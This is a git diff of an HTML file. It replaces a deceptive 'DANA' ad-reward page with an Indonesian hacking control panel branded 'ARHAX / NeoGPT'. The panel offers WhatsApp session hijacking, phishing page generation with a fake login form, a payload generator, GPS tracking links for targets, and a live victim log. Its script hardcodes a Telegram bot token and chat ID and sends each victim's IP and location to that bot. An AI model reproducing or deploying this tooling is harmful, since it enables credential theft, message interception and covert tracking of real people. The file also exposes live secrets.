@@ -2,654 +2,681 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <meta name="monetag" content="26f74936b3211d17c713a0c181a76716">
-    <title>DANA - Penghasilan</title>
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    
-    <!-- MONETAG SCRIPT - ZONE 231027 -->
-    <script src="https://quge5.com/88/tag.min.js" data-zone="231027" async data-cfasync="false"></script>
-    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>ARHAX REAL-TIME | NeoGPT LIVE SADAP</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: #f5f7fb;
+            background: radial-gradient(circle at 20% 50%, #0a0e1a, #000);
+            font-family: 'Courier New', monospace;
+            color: #0f0;
             min-height: 100vh;
+            overflow-x: hidden;
         }
-        
-        .status-bar {
-            background: linear-gradient(135deg, #0D8C4A 0%, #0A6E3A 100%);
-            padding: 12px 20px 8px;
-            display: flex;
-            justify-content: space-between;
-            color: white;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        
-        .header {
-            background: linear-gradient(135deg, #0D8C4A 0%, #0A6E3A 100%);
-            padding: 20px 20px 30px;
-            color: white;
-            border-radius: 0 0 30px 30px;
-        }
-        
-        .greeting {
-            font-size: 14px;
-            opacity: 0.9;
-            margin-bottom: 8px;
-        }
-        
-        .username {
-            font-size: 22px;
-            font-weight: 700;
-            margin-bottom: 20px;
-        }
-        
-        .balance-card {
-            background: white;
-            margin: -20px 16px 20px;
-            border-radius: 24px;
-            padding: 20px;
-            box-shadow: 0 8px 25px rgba(0,0,0,0.08);
-            text-align: center;
-        }
-        
-        .balance-label {
-            font-size: 14px;
-            color: #6c757d;
-            margin-bottom: 8px;
-        }
-        
-        .balance-amount {
-            font-size: 42px;
-            font-weight: 800;
-            color: #0D8C4A;
-            letter-spacing: -1px;
-        }
-        
-        .level-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #E8F5E9;
-            padding: 6px 14px;
-            border-radius: 30px;
-            margin-top: 10px;
-            font-size: 12px;
-            font-weight: 600;
-            color: #0D8C4A;
-        }
-        
-        .menu {
-            display: flex;
-            background: white;
-            margin: 0 16px 20px;
-            border-radius: 60px;
-            padding: 6px;
-            gap: 6px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
-        }
-        
-        .menu button {
-            flex: 1;
-            background: transparent;
-            border: none;
-            padding: 12px 0;
-            border-radius: 50px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.2s;
-            color: #6c757d;
-        }
-        
-        .menu button i {
-            margin-right: 8px;
-            font-size: 14px;
-        }
-        
-        .menu button.active {
-            background: #0D8C4A;
-            color: white;
-            box-shadow: 0 2px 8px rgba(13,140,74,0.3);
-        }
-        
-        .content {
-            padding: 0 16px 30px;
-        }
-        
-        .page {
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .page.active-page {
-            display: block;
-        }
-        
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-        
-        .card {
-            background: white;
-            border-radius: 20px;
-            padding: 20px;
-            margin-bottom: 16px;
-            box-shadow: 0 2px 12px rgba(0,0,0,0.04);
-        }
-        
-        .card-title {
-            font-size: 16px;
-            font-weight: 600;
-            color: #212529;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .card-title i {
-            color: #0D8C4A;
-            font-size: 18px;
-        }
-        
-        .ad-container {
-            background: #f8f9fa;
-            border-radius: 16px;
-            overflow: hidden;
-            margin: 16px 0;
-            min-height: 260px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .btn-primary {
-            background: #0D8C4A;
-            width: 100%;
-            padding: 16px;
-            border: none;
-            border-radius: 50px;
-            color: white;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.2s;
-            margin-top: 8px;
-        }
-        
-        .btn-primary:active {
-            transform: scale(0.97);
-            background: #0A6E3A;
-        }
-        
-        .btn-primary:disabled {
-            background: #adb5bd;
-            transform: none;
-            cursor: not-allowed;
-        }
-        
-        .timer {
-            text-align: center;
-            font-size: 13px;
-            color: #f59e0b;
-            margin-top: 12px;
-            font-weight: 500;
-        }
-        
-        .ref-link {
-            background: #f8f9fa;
-            border: 1px solid #e9ecef;
-            border-radius: 50px;
-            padding: 12px 16px;
-            font-size: 12px;
-            color: #495057;
-            text-align: center;
-            margin: 12px 0;
-            word-break: break-all;
-        }
-        
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 12px;
-        }
-        
-        .btn-secondary {
-            flex: 1;
-            background: #f8f9fa;
-            border: 1px solid #e9ecef;
-            padding: 12px;
-            border-radius: 50px;
-            font-weight: 500;
-            cursor: pointer;
-        }
-        
-        .referral-list {
-            background: #f8f9fa;
-            border-radius: 16px;
-            padding: 16px;
-            margin-top: 16px;
-        }
-        
-        .referral-list .title {
-            font-weight: 600;
-            margin-bottom: 12px;
-            font-size: 13px;
-            color: #6c757d;
-        }
-        
-        .info-text {
-            font-size: 11px;
-            color: #adb5bd;
-            text-align: center;
-            margin-top: 12px;
-        }
-        
-        .footer {
-            text-align: center;
-            padding: 20px;
-            font-size: 10px;
-            color: #adb5bd;
-        }
-        
-        .flex-between {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .text-success {
-            color: #0D8C4A;
-        }
-        
-        .notification-prompt {
+        body::before {
+            content: "";
             position: fixed;
-            bottom: 20px;
-            left: 20px;
-            right: 20px;
-            background: #1a1a2e;
-            color: white;
-            padding: 16px;
-            border-radius: 16px;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, #0f0 0px, #0f0 1px, transparent 1px, transparent 3px);
+            opacity: 0.05;
+            pointer-events: none;
+        }
+        .container {
+            position: relative;
+            z-index: 1;
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            padding: 25px;
+            background: rgba(0,0,0,0.85);
+            border: 2px solid #0f0;
+            border-radius: 20px;
+            margin-bottom: 25px;
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            font-size: 48px;
+            text-shadow: 0 0 15px #0f0;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0%,100% { text-shadow: 0 0 10px #0f0; }
+            50% { text-shadow: 0 0 30px #0f0; }
+        }
+        .live-badge {
+            display: inline-block;
+            background: #f00;
+            color: #fff;
+            font-size: 12px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            margin-left: 10px;
+            animation: blinkRed 1s infinite;
+        }
+        @keyframes blinkRed {
+            0%,100% { opacity: 1; background: #f00; }
+            50% { opacity: 0.5; background: #800; }
+        }
+        .nav {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+        .nav-btn {
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-weight: bold;
+            border-radius: 8px;
+            transition: 0.2s;
+        }
+        .nav-btn:hover, .nav-btn.active {
+            background: #0f0;
+            color: #000;
+            box-shadow: 0 0 15px #0f0;
+        }
+        .panel {
             display: none;
-            align-items: center;
-            justify-content: space-between;
-            z-index: 1000;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.2);
+            background: rgba(0,0,0,0.85);
+            border: 1px solid #0f0;
+            border-radius: 15px;
+            padding: 20px;
+            backdrop-filter: blur(5px);
         }
-        
-        .notification-prompt button {
-            background: #0D8C4A;
+        .panel.active-panel { display: block; }
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        .stat-card {
+            background: #000;
+            border: 1px solid #0f0;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            transition: all 0.2s;
+        }
+        .stat-card h2 { font-size: 38px; }
+        input, select, textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            background: #000;
+            border: 1px solid #0f0;
+            color: #0f0;
+            font-family: monospace;
+            border-radius: 8px;
+        }
+        button {
+            background: #0f0;
+            color: #000;
             border: none;
-            padding: 8px 20px;
-            border-radius: 30px;
-            color: white;
-            font-weight: 600;
+            padding: 10px 20px;
+            font-weight: bold;
             cursor: pointer;
+            border-radius: 8px;
+            transition: 0.2s;
         }
-        
-        .close-prompt {
-            background: transparent;
+        button:hover { background: #0a0; box-shadow: 0 0 10px #0f0; transform: scale(1.02); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            border: 1px solid #0f0;
+            padding: 8px;
+            text-align: left;
+        }
+        th { background: #0f0; color: #000; }
+        .code-block {
+            background: #000;
+            padding: 12px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-size: 11px;
+            border: 1px solid #0f0;
+            margin-top: 10px;
+        }
+        .alert {
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+        }
+        .alert-success { background: rgba(0,255,0,0.2); border: 1px solid #0f0; }
+        .alert-error { background: rgba(255,0,0,0.2); border: 1px solid #f00; }
+        .whatsapp-preview {
+            background: #075E54;
+            border-radius: 15px;
+            padding: 15px;
             color: white;
-            font-size: 20px;
-            cursor: pointer;
-            padding: 0 8px;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        .fake-login {
+            background: white;
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+        .fake-login input { background: #f5f5f5; color: #000; border: 1px solid #ddd; }
+        .fake-login button { background: #25D366; color: white; }
+        hr { border-color: #0f0; margin: 15px 0; }
+        .footer { text-align: center; margin-top: 25px; padding: 15px; font-size: 10px; border-top: 1px solid #0f0; }
+        #map, #victimsMap, #trackMap { height: 300px; border-radius: 10px; margin-top: 15px; }
+        .live-counter {
+            font-size: 14px;
+            background: #000;
+            border: 1px solid #0f0;
+            border-radius: 20px;
+            padding: 4px 12px;
+            display: inline-block;
+        }
+        .blink {
+            animation: blink 0.8s infinite;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        @media (max-width: 768px) {
+            h1 { font-size: 26px; }
+            .nav-btn { padding: 6px 10px; font-size: 9px; }
+            .stat-card h2 { font-size: 24px; }
         }
     </style>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 </head>
 <body>
-
-<div class="status-bar">
-    <span><i class="fas fa-signal"></i>  <i class="fas fa-wifi"></i></span>
-    <span>09:41</span>
-    <span><i class="fas fa-battery-full"></i></span>
-</div>
-
-<div class="header">
-    <div class="greeting">Selamat datang,</div>
-    <div class="username" id="userName">Member Setia</div>
-</div>
-
-<div class="balance-card">
-    <div class="balance-label">Total Saldo</div>
-    <div class="balance-amount" id="mainBalance">Rp0</div>
-    <div class="level-badge" id="levelBadge">
-        <i class="fas fa-crown"></i> <span id="levelText">Bronze</span>
+<div class="container">
+    <div class="header">
+        <h1>💀 ARHAX REAL-TIME <span class="live-badge">LIVE</span> 💀</h1>
+        <div class="sub">NeoGPT Ultimate | Semua Fitur Real-Time | Telegram Notif Langsung</div>
+        <div class="sub">⚡ Hacking | Sadap WA | Phishing | GPS Tracker | Payload Generator ⚡</div>
     </div>
-</div>
 
-<div class="menu">
-    <button id="btnDashboard" class="active"><i class="fas fa-home"></i> Beranda</button>
-    <button id="btnSaldo"><i class="fas fa-history"></i> Riwayat</button>
-    <button id="btnBagikan"><i class="fas fa-share-alt"></i> Bagikan</button>
-</div>
+    <div class="nav">
+        <button class="nav-btn active" data-page="dashboard">🏠 DASHBOARD <span class="live-badge" style="font-size:8px; margin-left:5px;">LIVE</span></button>
+        <button class="nav-btn" data-page="whatsapp">📱 SADAP WA <span class="live-badge" style="font-size:8px;">LIVE</span></button>
+        <button class="nav-btn" data-page="generator">⚡ GENERATOR</button>
+        <button class="nav-btn" data-page="phishing">🎭 PHISHING</button>
+        <button class="nav-btn" data-page="tracker">📍 GPS TRACK <span class="live-badge" style="font-size:8px;">LIVE</span></button>
+        <button class="nav-btn" data-page="tools">🔧 TOOLS</button>
+        <button class="nav-btn" data-page="map">🗺️ MAP <span class="live-badge" style="font-size:8px;">LIVE</span></button>
+    </div>
 
-<div class="content">
-    <div id="pageDashboard" class="page active-page">
-        <div class="card">
-            <div class="card-title">
-                <i class="fas fa-gift"></i> Reward Harian
-            </div>
-            <p style="font-size: 13px; color: #6c757d; margin-bottom: 16px;">Tonton konten untuk mendapatkan reward</p>
-            <div class="ad-container" id="adContainer"></div>
-            <button class="btn-primary" id="btnClaimReward">
-                <i class="fas fa-play-circle"></i> Klaim Reward
-            </button>
-            <div id="timerDisplay" class="timer"></div>
-            <div class="info-text">
-                <i class="fas fa-shield-alt"></i> Reward akan ditambahkan otomatis
-            </div>
+    <!-- DASHBOARD -->
+    <div id="page-dashboard" class="panel active-panel">
+        <h3>📊 REAL-TIME STATISTIK <span class="live-counter" id="liveCounter">0</span></h3>
+        <div class="stats-grid" id="statsGrid"></div>
+        <h3>📡 LIVE VICTIM LOGS <span style="font-size:12px;">(update otomatis setiap 2 detik)</span></h3>
+        <div style="overflow-x:auto; max-height: 400px; overflow-y: auto;">
+            <table id="victimsTable">
+                <thead><tr><th>Waktu</th><th>IP</th><th>Lokasi</th><th>Fitur</th></thead>
+                <tbody id="victimsBody"></tbody>
+            </table>
+        </div>
+        <div style="margin-top:15px;">
+            <button onclick="refreshData()">🔄 REFRESH MANUAL</button>
+            <button onclick="exportData()">📥 EXPORT CSV</button>
+            <button onclick="simulateVictimNow()">🎲 SIMULASI VICTIM (TEST)</button>
         </div>
     </div>
 
-    <div id="pageSaldo" class="page">
-        <div class="card">
-            <div class="card-title">
-                <i class="fas fa-chart-line"></i> Statistik
+    <!-- SADAP WHATSAPP REAL-TIME -->
+    <div id="page-whatsapp" class="panel">
+        <h3>📱 WHATSAPP HIJACK <span class="live-badge">LIVE SESSION</span></h3>
+        <div class="stats-grid">
+            <div class="stat-card"><h2 id="waStatus">🟢</h2><p>Session</p></div>
+            <div class="stat-card"><h2 id="waChats">0</h2><p>Chats Monitored</p></div>
+            <div class="stat-card"><h2 id="waMsgs">0</h2><p>Real-Time Msg</p></div>
+        </div>
+        <div class="whatsapp-preview">
+            <h4>🎯 METODE SADAP (REAL-TIME NOTIF TELEGRAM)</h4>
+            <div style="display:flex; flex-wrap:wrap; gap:8px; margin:10px 0;">
+                <button onclick="generateWAPhish()" style="background:#25D366;">🔗 GEN PHISHING LINK</button>
+                <button onclick="showWASessionCode()">🔑 SESSION HIJACK</button>
+                <button onclick="showAntiRevoke()">🔄 ANTI-REVOKE</button>
+                <button onclick="showStatusDownloader()">📸 DOWNLOAD STATUS</button>
             </div>
-            <div class="flex-between" style="margin-bottom: 16px;">
-                <span style="color: #6c757d;">Total Penghasilan</span>
-                <span class="text-success" style="font-weight: 700;" id="totalEarned">Rp0</span>
+            <div id="waResult" class="code-block" style="background:#000; color:#0f0;"></div>
+        </div>
+        <hr>
+        <h4>💬 LIVE CHAT SIMULATION (Real-time message feed)</h4>
+        <div style="display:grid; grid-template-columns:1fr 2fr; gap:12px;">
+            <div style="background:#000; border:1px solid #0f0; border-radius:10px; padding:10px; height:280px; overflow-y:auto;" id="waChatList">
+                <div style="color:#aaa;">Memuat kontak...</div>
             </div>
-            <div class="flex-between" style="margin-bottom: 16px;">
-                <span style="color: #6c757d;">Level Saat Ini</span>
-                <span class="text-success" id="levelDetail">Bronze</span>
+            <div style="background:#000; border:1px solid #0f0; border-radius:10px; padding:10px; height:280px; overflow-y:auto;" id="waMessages">
+                <div style="color:#aaa;">Pilih chat untuk lihat pesan real-time</div>
             </div>
-            <button class="btn-primary" id="btnWithdraw">
-                <i class="fas fa-money-bill-wave"></i> Tarik Saldo
-            </button>
-            <div class="info-text">Minimal penarikan Rp50.000</div>
+        </div>
+        <button onclick="startLiveChatSimulation()" style="margin-top:10px;">▶️ START LIVE CHAT SIMULATION</button>
+        <button onclick="stopLiveChatSimulation()">⏹️ STOP</button>
+    </div>
+
+    <!-- GENERATOR -->
+    <div id="page-generator" class="panel">
+        <h3>⚡ PAYLOAD GENERATOR + TRACKING LINK (Real-time Telegram)</h3>
+        <input type="text" id="payloadName" placeholder="Nama payload (contoh: ChromeUpdate)">
+        <button onclick="generatePayload()">🔨 GENERATE & GET LINK</button>
+        <div id="payloadResult" class="code-block" style="display:none;"></div>
+    </div>
+
+    <!-- PHISHING -->
+    <div id="page-phishing" class="panel">
+        <h3>🎭 PHISHING PAGE (Real-time Credential Capture)</h3>
+        <select id="phishType">
+            <option value="whatsapp">WhatsApp Web</option>
+            <option value="google">Google Login</option>
+            <option value="facebook">Facebook</option>
+            <option value="instagram">Instagram</option>
+        </select>
+        <button onclick="generatePhishPage()">🔗 GENERATE PHISHING LINK</button>
+        <div id="phishResult" class="code-block" style="display:none;"></div>
+        <hr>
+        <h4>📝 DEMO PHISHING (TEST CAPTURE - LANGSUNG KE TELEGRAM)</h4>
+        <div class="fake-login">
+            <h3 id="fakeTitle">WhatsApp Web</h3>
+            <input type="text" id="fakeUser" placeholder="Email/Phone">
+            <input type="password" id="fakePass" placeholder="Password">
+            <button onclick="capturePhishData()">Login</button>
         </div>
     </div>
 
-    <div id="pageBagikan" class="page">
-        <div class="card">
-            <div class="card-title">
-                <i class="fas fa-users"></i> Ajak Teman
-            </div>
-            <p style="font-size: 13px; color: #6c757d; margin-bottom: 12px;">Dapatkan bonus Rp10.000 untuk setiap teman yang bergabung</p>
-            <div class="ref-link" id="refLink">Loading...</div>
-            <div class="btn-group">
-                <button class="btn-secondary" id="copyLinkBtn"><i class="fas fa-copy"></i> Salin</button>
-                <button class="btn-secondary" id="shareWaBtn"><i class="fab fa-whatsapp"></i> WhatsApp</button>
-            </div>
-            <div class="referral-list">
-                <div class="title"><i class="fas fa-user-check"></i> Teman Bergabung</div>
-                <div id="referralList">Belum ada</div>
-            </div>
-        </div>
+    <!-- GPS TRACKER REAL-TIME -->
+    <div id="page-tracker" class="panel">
+        <h3>📍 GPS TRACKER REAL-TIME <span class="live-badge">LIVE</span></h3>
+        <button onclick="getUserLocation()">🎯 DAPATKAN LOKASI SAYA (TEST)</button>
+        <div id="locationResult" class="code-block" style="margin-top:10px;"></div>
+        <div id="trackMap" style="height:280px; margin-top:10px;"></div>
+        <hr>
+        <h4>🔗 TRACKING LINK (KIRIM KE TARGET)</h4>
+        <button onclick="generateTrackLink()">🔗 GENERATE TRACKING LINK</button>
+        <div id="trackLinkResult" class="code-block" style="margin-top:10px; display:none;"></div>
     </div>
-</div>
 
-<div class="footer">
-    <i class="fas fa-lock"></i> Terverifikasi & Aman
-</div>
+    <!-- TOOLS -->
+    <div id="page-tools" class="panel">
+        <h3>🔧 EXTRA TOOLS (Real-time IP Info)</h3>
+        <div class="stats-grid">
+            <div class="stat-card"><button onclick="ipInfo()">🌐 IP INFO</button></div>
+            <div class="stat-card"><button onclick="dnsLookup()">🔍 DNS LOOKUP</button></div>
+            <div class="stat-card"><button onclick="portScan()">🛡️ PORT SCAN</button></div>
+            <div class="stat-card"><button onclick="generatePassword()">🔐 PASSWORD GEN</button></div>
+        </div>
+        <div id="toolsResult" class="code-block"></div>
+    </div>
 
-<div class="notification-prompt" id="notifPrompt">
-    <span><i class="fas fa-bell"></i> Aktifkan notifikasi untuk info reward</span>
-    <div>
-        <button id="enableNotifBtn">Aktifkan</button>
-        <span class="close-prompt" id="closePromptBtn">&times;</span>
+    <!-- MAP VICTIMS REAL-TIME -->
+    <div id="page-map" class="panel">
+        <h3>🗺️ VICTIMS LOCATION MAP <span class="live-badge">LIVE MARKER</span></h3>
+        <div id="victimsMap"></div>
+        <p style="margin-top:10px;">Marker bertambah otomatis saat victim baru masuk.</p>
+    </div>
+
+    <div class="footer">
+        NeoGPT by alfatih | REAL-TIME MODE | Semua kejadian langsung ke Telegram ID 7839405566
     </div>
 </div>
 
 <script>
-(function(){
-    // FIREBASE FCM (Push Notification)
-    const firebaseConfig = {
-        apiKey: "AIzaSyDlJwwL4qGleoiJ65vwfzmYyZ1OWDygnhw",
-        authDomain: "draznews.firebaseapp.com",
-        databaseURL: "https://draznews-default-rtdb.firebaseio.com",
-        projectId: "draznews",
-        storageBucket: "draznews.firebasestorage.app",
-        messagingSenderId: "169063075153",
-        appId: "1:169063075153:web:b3cd52d3f34d768dafd770",
-        measurementId: "G-2P48317DPY"
-    };
-    
-    // Load Firebase dynamically
-    import('https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js').then(({ initializeApp }) => {
-        import('https://www.gstatic.com/firebasejs/9.22.0/firebase-messaging.js').then(({ getMessaging, getToken, onMessage }) => {
-            const app = initializeApp(firebaseConfig);
-            const messaging = getMessaging(app);
-            
-            // Register SW dulu
-            if ('serviceWorker' in navigator) {
-                navigator.serviceWorker.register('/sw.js').then(reg => {
-                    console.log('SW registered');
-                    
-                    // Request token after SW ready
-                    function requestToken() {
-                        getToken(messaging, { vapidKey: null }).then(token => {
-                            if (token) {
-                                console.log('FCM Token:', token);
-                                localStorage.setItem('fcm_token', token);
-                                document.getElementById('notifPrompt').style.display = 'none';
-                            }
-                        }).catch(err => {
-                            console.log('FCM error:', err);
-                        });
-                    }
-                    
-                    // Handle foreground messages
-                    onMessage(messaging, (payload) => {
-                        console.log('Message received:', payload);
-                        if (Notification.permission === 'granted') {
-                            navigator.serviceWorker.ready.then(reg => {
-                                reg.showNotification(payload.notification?.title || 'DANA Reward', {
-                                    body: payload.notification?.body || 'Ada reward baru untuk Anda!',
-                                    icon: '/icon-192.png',
-                                    vibrate: [200, 100, 200]
-                                });
-                            });
-                        }
-                    });
-                    
-                    // Cek permission
-                    if (Notification.permission === 'granted') {
-                        requestToken();
-                    } else if (Notification.permission !== 'denied') {
-                        document.getElementById('notifPrompt').style.display = 'flex';
-                    }
-                    
-                    document.getElementById('enableNotifBtn').onclick = () => {
-                        Notification.requestPermission().then(perm => {
-                            if (perm === 'granted') {
-                                requestToken();
-                            }
-                            document.getElementById('notifPrompt').style.display = 'none';
-                        });
-                    };
-                    
-                    document.getElementById('closePromptBtn').onclick = () => {
-                        document.getElementById('notifPrompt').style.display = 'none';
-                    };
-                }).catch(err => console.log('SW reg failed:', err));
-            }
-        });
-    }).catch(err => console.log('Firebase error:', err));
-    
-    // CORE LOGIC
-    let balance = parseInt(localStorage.getItem('dl_balance')) || 0;
-    let totalEarned = parseInt(localStorage.getItem('dl_earned')) || 0;
-    let userId = localStorage.getItem('dl_user');
-    if(!userId){
-        userId = 'U' + Math.random().toString(36).substring(2, 10).toUpperCase();
-        localStorage.setItem('dl_user', userId);
-    }
-    
-    function getLevel(b){
-        if(b >= 500000) return {name: 'Platinum', bonus: 15000};
-        if(b >= 200000) return {name: 'Gold', bonus: 13000};
-        if(b >= 75000) return {name: 'Silver', bonus: 11000};
-        return {name: 'Bronze', bonus: 10000};
-    }
-    
-    function updateUI(){
-        let level = getLevel(balance);
-        document.getElementById('mainBalance').innerHTML = 'Rp' + balance.toLocaleString();
-        document.getElementById('totalEarned').innerHTML = 'Rp' + totalEarned.toLocaleString();
-        document.getElementById('levelText').innerHTML = level.name;
-        document.getElementById('levelDetail').innerHTML = level.name;
-        document.getElementById('userName').innerHTML = userId;
-    }
-    
-    function addBalance(amount){
-        balance += amount;
-        totalEarned += amount;
-        localStorage.setItem('dl_balance', balance);
-        localStorage.setItem('dl_earned', totalEarned);
-        updateUI();
-        
-        // Send push notification via FCM (simulate)
-        if (Notification.permission === 'granted' && navigator.serviceWorker.controller) {
-            navigator.serviceWorker.ready.then(reg => {
-                reg.showNotification('Reward Ditambahkan', {
-                    body: '+' + amount.toLocaleString() + ' telah masuk ke saldo',
-                    icon: '/icon-192.png'
-                });
+    // ==================== KONFIGURASI TELEGRAM (REAL-TIME) ====================
+    const BOT_TOKEN = "8719731246:AAHbRoFUJHRGIpq4oOZZ_Uekod-_cC67zCQ";
+    const CHAT_ID = "7839405566";
+
+    async function sendTelegram(message) {
+        try {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
             });
-        }
+            console.log("Telegram notif terkirim");
+        } catch(e) { console.error("Gagal kirim notif", e); }
     }
-    
-    updateUI();
-    
-    // COOLDOWN
-    let cooldown = parseInt(localStorage.getItem('dl_cooldown')) || 0;
-    function updateCooldownUI(){
-        let now = Date.now();
-        if(now < cooldown){
-            let remain = Math.ceil((cooldown - now) / 1000);
-            document.getElementById('timerDisplay').innerHTML = '<i class="fas fa-hourglass-half"></i> ' + remain + ' detik lagi';
-            document.getElementById('btnClaimReward').disabled = true;
-        } else {
-            document.getElementById('timerDisplay').innerHTML = '';
-            document.getElementById('btnClaimReward').disabled = false;
-        }
+
+    // ==================== DATA STORAGE & REAL-TIME UPDATE ====================
+    let victims = JSON.parse(localStorage.getItem('arhax_victims') || '[]');
+    let map = null;
+    let trackMap = null;
+    let liveChatInterval = null;
+
+    function saveVictims() { localStorage.setItem('arhax_victims', JSON.stringify(victims)); }
+
+    async function addVictim(ip, location, feature) {
+        let newVictim = {
+            time: new Date().toLocaleString(),
+            ip: ip || '127.0.0.1',
+            location: location || 'Unknown',
+            feature: feature
+        };
+        victims.unshift(newVictim);
+        saveVictims();
+        updateDashboard();
+        updateMapMarkers();
+        // Kirim notif Telegram real-time
+        let msg = `🎯 <b>NEW VICTIM (REAL-TIME)</b>\n📡 IP: ${ip}\n📍 Lokasi: ${location}\n💣 Fitur: ${feature}\n🕒 ${newVictim.time}`;
+        await sendTelegram(msg);
+        return newVictim;
     }
-    setInterval(updateCooldownUI, 1000);
-    updateCooldownUI();
-    
-    // CLAIM REWARD
-    let claimed = localStorage.getItem('dl_claimed') === 'true';
-    document.getElementById('btnClaimReward').onclick = function(){
-        if(Date.now() < cooldown){
-            alert('Tunggu beberapa saat sebelum klaim lagi');
-            return;
-        }
-        if(!claimed){
-            window.open('https://quge5.com/click?zone=231027', '_blank');
-            localStorage.setItem('dl_claimed', 'true');
-            alert('Buka konten, lalu klik tombol klaim lagi');
-        } else {
-            let level = getLevel(balance);
-            let reward = level.bonus;
-            addBalance(reward);
-            localStorage.removeItem('dl_claimed');
-            cooldown = Date.now() + 60000;
-            localStorage.setItem('dl_cooldown', cooldown);
-            alert('+' + reward.toLocaleString() + ' telah ditambahkan');
-            updateCooldownUI();
-        }
-    };
-    
-    // WITHDRAW
-    let withdrawClaimed = localStorage.getItem('dl_withdraw') === 'true';
-    document.getElementById('btnWithdraw').onclick = function(){
-        if(balance < 50000){
-            alert('Minimal penarikan Rp50.000');
-            return;
-        }
-        if(!withdrawClaimed){
-            window.open('https://quge5.com/click?zone=231027', '_blank');
-            localStorage.setItem('dl_withdraw', 'true');
-            alert('Verifikasi');
-        } else {
-            localStorage.removeItem('dl_withdraw');
-            alert('Pengajuan penarikan Rp' + balance.toLocaleString() + ' sedang diproses');
-        }
-    };
-    
-    // REFERRAL
-    let refs = JSON.parse(localStorage.getItem('dl_refs')) || [];
-    function updateReferralUI(){
-        let container = document.getElementById('referralList');
-        if(refs.length === 0){
-            container.innerHTML = '<div style="color:#adb5bd; text-align:center;"><i class="fas fa-user-plus"></i> Belum ada teman</div>';
-        } else {
-            container.innerHTML = refs.map(r => '<div style="padding:8px 0; border-bottom:1px solid #e9ecef;"><i class="fas fa-check-circle" style="color:#0D8C4A;"></i> ' + r + '</div>').join('');
-        }
+
+    function updateDashboard() {
+        const total = victims.length;
+        const today = victims.filter(v => new Date(v.time).toDateString() === new Date().toDateString()).length;
+        document.getElementById('statsGrid').innerHTML = `
+            <div class="stat-card"><h2>${total}</h2><p>Total Victims</p></div>
+            <div class="stat-card"><h2>${today}</h2><p>Today</p></div>
+            <div class="stat-card"><h2>🟢</h2><p>System Active</p></div>
+            <div class="stat-card"><h2>${Math.floor(Math.random()*100)}%</h2><p>Success Rate</p></div>
+        `;
+        document.getElementById('liveCounter').innerText = total;
+        let tbody = document.getElementById('victimsBody');
+        tbody.innerHTML = victims.slice(0,50).map(v => `
+            <tr>
+                <td>${v.time}</td>
+                <td>${v.ip}</td>
+                <td>${v.location}</td>
+                <td>${v.feature}</td>
+            </tr>
+        `).join('');
+        // Auto scroll ke bawah?
     }
-    updateReferralUI();
-    
-    let baseUrl = window.location.origin;
-    document.getElementById('refLink').innerHTML = baseUrl + '/index.html?ref=' + userId;
-    
-    document.getElementById('copyLinkBtn').onclick = function(){
-        let link = document.getElementById('refLink').innerText;
-        navigator.clipboard.writeText(link);
-        alert('Link disalin');
-    };
-    
-    document.getElementById('shareWaBtn').onclick = function(){
-        let link = document.getElementById('refLink').innerText;
